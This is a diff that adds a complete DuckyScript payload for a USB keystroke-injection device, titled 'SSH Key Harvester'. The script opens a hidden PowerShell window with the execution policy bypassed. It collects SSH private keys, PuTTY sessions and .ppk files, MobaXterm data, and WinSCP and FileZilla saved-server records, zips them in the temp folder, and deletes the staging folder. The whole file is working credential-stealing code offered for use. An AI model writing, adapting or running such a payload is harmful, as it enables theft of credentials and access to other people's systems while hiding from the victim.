@@ -1,0 +1,71 @@
+REM =============================================
+REM Title: SSH Key Harvester
+REM Author: bad-antics
+REM Description: Extract SSH keys and known_hosts
+REM Category: nullsec/exfil
+REM Target: Windows 10/11
+REM =============================================
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -w hidden -ep bypass
+ENTER
+DELAY 800
+
+REM Create loot directory
+STRING $d="$env:TEMP\sshloot";mkdir $d -Force|Out-Null
+ENTER
+DELAY 200
+
+REM Grab OpenSSH keys
+STRING if(Test-Path "$env:USERPROFILE\.ssh"){cp -r "$env:USERPROFILE\.ssh\*" "$d\" -Force 2>$null}
+ENTER
+DELAY 300
+
+REM Check for PuTTY keys in registry
+STRING $putty=Get-ItemProperty -Path "HKCU:\Software\SimonTatham\PuTTY\Sessions\*" 2>$null
+ENTER
+DELAY 200
+
+STRING if($putty){$putty|Out-File "$d\putty_sessions.txt"}
+ENTER
+DELAY 200
+
+REM Extract PuTTY private keys
+STRING Get-ChildItem "$env:USERPROFILE\*.ppk" -Recurse -ErrorAction SilentlyContinue|%{cp $_.FullName "$d\"}
+ENTER
+DELAY 300
+
+REM Grab MobaXterm credentials
+STRING if(Test-Path "$env:APPDATA\MobaXterm"){cp -r "$env:APPDATA\MobaXterm" "$d\mobaxterm" -Force}
+ENTER
+DELAY 200
+
+REM Grab WinSCP data
+STRING $winscp="HKCU:\Software\Martin Prikryl\WinSCP 2\Sessions";if(Test-Path $winscp){Get-ChildItem $winscp|%{Get-ItemProperty $_.PSPath}|Out-File "$d\winscp_sessions.txt"}
+ENTER
+DELAY 200
+
+REM Grab FileZilla saved servers
+STRING if(Test-Path "$env:APPDATA\FileZilla\sitemanager.xml"){cp "$env:APPDATA\FileZilla\sitemanager.xml" "$d\filezilla_sites.xml"}
+ENTER
+DELAY 200
+
+REM Create inventory
+STRING Get-ChildItem $d|Select Name,Length|Out-File "$d\inventory.txt"
+ENTER
+DELAY 200
+
+REM Compress
+STRING Compress-Archive -Path $d -DestinationPath "$env:TEMP\sshkeys_$(hostname).zip" -Force
+ENTER
+DELAY 400
+
+REM Cleanup
+STRING Remove-Item $d -Recurse -Force
+ENTER
+DELAY 100
+
+STRING exit
+ENTER
